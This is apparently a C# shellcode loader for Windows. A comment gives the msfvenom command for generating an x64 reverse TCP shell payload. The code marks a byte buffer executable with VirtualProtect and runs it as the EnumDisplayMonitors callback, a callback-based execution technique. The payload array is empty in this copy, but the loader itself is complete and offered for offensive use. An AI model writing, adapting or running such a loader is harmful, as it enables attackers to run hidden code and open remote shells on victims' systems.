using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{

    class ShlcRun
    {
        //msfvenom -p windows/x64/shell_reverse_tcp LHOST=wlan0 LPORT=8080 -f csharp
        static byte[] buf = new byte[460] {
             };

        public static void CreateTH()
        {
            unsafe
            {
                fixed (byte* ptr = buf)
                {
                    IntPtr memAddr = (IntPtr)ptr;

                    if (!VirtualProtect(memAddr, (uint)buf.Length, (uint)0x00000040, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, memAddr, IntPtr.Zero);
                }
            }
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("user32.dll")]
        static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, IntPtr lpfnEnum, IntPtr dwData);
    }
    class Program
    {
        static void Main(string[] args)
        {
            ShlcRun.CreateTH();
        }
    }
}
